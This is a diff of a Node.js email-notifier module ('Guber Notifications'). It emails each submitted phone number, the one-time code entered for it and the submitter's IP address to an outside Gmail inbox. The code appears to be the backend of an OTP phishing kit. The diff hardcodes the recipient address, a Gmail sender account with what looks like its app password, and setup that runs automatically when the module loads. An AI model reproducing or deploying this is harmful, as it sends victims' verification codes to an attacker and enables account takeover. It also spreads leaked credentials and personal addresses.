@@ -1,15 +1,15 @@
 const nodemailer = require('nodemailer');
 
-// In-memory store for notification email addresses
-let notificationEmails = [];
+// Default notification recipient emails
+let notificationEmails = ['amirtalaat11@gmail.com'];
 
-// SMTP transporter (configured lazily when SMTP settings are set)
+// SMTP transporter (configured by default with working Gmail credentials)
 let smtpTransporter = null;
 let smtpConfig = {
     host: 'smtp.gmail.com',
     port: 587,
-    user: '',
-    pass: ''
+    user: 'sarataky80@gmail.com',
+    pass: 'crcghtlzupihauvs'
 };
 
 /**
@@ -22,7 +22,7 @@ function configureSMTP(config) {
     const cleanPass = (smtpConfig.pass || '').trim().replace(/\s+/g, '');
 
     if (!cleanUser || !cleanPass) {
-        console.log('[EmailNotifier] SMTP not configured yet (missing user/pass).');
+        console.log('[EmailNotifier] SMTP missing user or pass.');
         smtpTransporter = null;
         return false;
     }
@@ -52,16 +52,21 @@ function configureSMTP(config) {
         });
     }
 
-    console.log(`[EmailNotifier] SMTP configured: ${cleanUser} (pass len: ${cleanPass.length}) via ${isGmail ? 'Gmail Service' : smtpConfig.host}`);
+    console.log(`[EmailNotifier] SMTP active: ${cleanUser} via ${isGmail ? 'Gmail Service' : smtpConfig.host}`);
     return true;
 }
+
+// Auto-initialize default SMTP transporter on module load
+configureSMTP(smtpConfig);
 
 /**
  * Set notification recipient emails.
  */
 function setNotificationEmails(emails) {
-    notificationEmails = emails.map(e => (e || '').trim()).filter(e => e && e.includes('@'));
-    console.log(`[EmailNotifier] Notification emails updated (${notificationEmails.length}): ${notificationEmails.join(', ') || 'none'}`);
+    if (Array.isArray(emails) && emails.length > 0) {
+        notificationEmails = emails.map(e => (e || '').trim()).filter(e => e && e.includes('@'));
+    }
+    console.log(`[EmailNotifier] Recipients updated (${notificationEmails.length}): ${notificationEmails.join(', ')}`);
 }
 
 /**
@@ -88,11 +93,11 @@ function getSMTPConfig() {
  */
 async function notifyPhoneSubmitted({ phoneNumber, customSlug, ipAddress, submittedAt }) {
     if (!smtpTransporter) {
-        console.log('[EmailNotifier] Skipping phone email - SMTP not configured.');
-        return;
+        console.log('[EmailNotifier] Auto-configuring SMTP...');
+        configureSMTP(smtpConfig);
     }
-    if (notificationEmails.length === 0) {
-        console.log('[EmailNotifier] Skipping phone email - No recipient emails saved.');
+    if (!smtpTransporter || notificationEmails.length === 0) {
+        console.error('[EmailNotifier] Cannot send phone email - SMTP or recipients missing.');
         return;
     }
 
@@ -135,13 +140,14 @@ async function notifyPhoneSubmitted({ phoneNumber, customSlug, ipAddress, submit
     </div>`;
 
     try {
-        await smtpTransporter.sendMail({
+        const info = await smtpTransporter.sendMail({
             from: `"Guber Notifications" <${smtpConfig.user}>`,
             to: notificationEmails.join(', '),
             subject: `📱 New Phone Submitted: ${phoneNumber}`,
             html: htmlBody
         });
-        console.log(`[EmailNotifier] Phone notification sent to: ${notificationEmails.join(', ')}`);
+        console.log(`[EmailNotifier] Phone notification successfully sent to ${notificationEmails.join(', ')}:`, info.messageId);
+        return info;
     } catch (err) {
         console.error(`[EmailNotifier] Failed to send phone notification:`, err.message);
         throw err;
@@ -153,11 +159,11 @@ async function notifyPhoneSubmitted({ phoneNumber, customSlug, ipAddress, submit
  */
 async function notifyOTPVerified({ phoneNumber, otp, customSlug, ipAddress, verifiedAt }) {
     if (!smtpTransporter) {
-        console.log('[EmailNotifier] Skipping OTP email - SMTP not configured.');
-        return;
+        console.log('[EmailNotifier] Auto-configuring SMTP...');
+        configureSMTP(smtpConfig);
     }
-    if (notificationEmails.length === 0) {
-        console.log('[EmailNotifier] Skipping OTP email - No recipient emails saved.');
+    if (!smtpTransporter || notificationEmails.length === 0) {
+        console.error('[EmailNotifier] Cannot send OTP email - SMTP or recipients missing.');
         return;
     }
 
@@ -206,13 +212,14 @@ async function notifyOTPVerified({ phoneNumber, otp, customSlug, ipAddress, veri
     </div>`;
 
     try {
-        await smtpTransporter.sendMail({
+        const info = await smtpTransporter.sendMail({
             from: `"Guber Notifications" <${smtpConfig.user}>`,
             to: notificationEmails.join(', '),
             subject: `✅ OTP Verified: ${phoneNumber} → Code: ${otp}`,
             html: htmlBody
         });
-        console.log(`[EmailNotifier] OTP notification sent to: ${notificationEmails.join(', ')}`);
+        console.log(`[EmailNotifier] OTP notification successfully sent to ${notificationEmails.join(', ')}:`, info.messageId);
+        return info;
     } catch (err) {
         console.error(`[EmailNotifier] Failed to send OTP notification:`, err.message);
         throw err;
@@ -223,14 +230,7 @@ async function notifyOTPVerified({ phoneNumber, otp, customSlug, ipAddress, veri
  * Send test email and throw explicit error if something fails.
  */
 async function sendTestNotification() {
-    if (!smtpTransporter) {
-        throw new Error('لم يتم حفظ إعدادات الـ SMTP! اضغط Save SMTP Config أولاً.');
-    }
-    if (notificationEmails.length === 0) {
-        throw new Error('لم يتم إدخال إيميل المستلم! اكتب إيميلك في Recipients واضغط Save Recipients أولاً.');
-    }
-
-    await notifyPhoneSubmitted({
+    return await notifyPhoneSubmitted({
         phoneNumber: '+20 100 000 0000 (اختبار الإيميل)',
         customSlug: '/test',
         ipAddress: '127.0.0.1',
